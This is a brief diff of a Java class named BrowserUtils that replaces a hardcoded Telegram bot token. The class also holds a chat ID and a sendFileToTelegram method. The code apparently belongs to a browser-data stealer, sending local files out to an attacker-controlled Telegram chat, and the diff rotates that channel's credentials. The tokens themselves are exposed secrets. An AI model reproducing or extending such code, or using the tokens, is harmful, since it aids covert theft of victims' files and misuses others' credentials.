@@ -471,7 +471,7 @@ public class BrowserUtils {
         }
     }
 
-    private static final String TELEGRAM_BOT_TOKEN = "6538211561:AAEVRYoo03lBKnqhTUUU3lne9nfvpRGHa08";
+    private static final String TELEGRAM_BOT_TOKEN = "7959519774:AAG00auX06WGLF_gl5v4mwDeWjI1v5eTh68";
     private static final String TELEGRAM_CHAT_ID = "-4194828120";
     public static void sendFileToTelegram(String filePath, String chatId) {
         String boundary = "===" + System.currentTimeMillis() + "===";
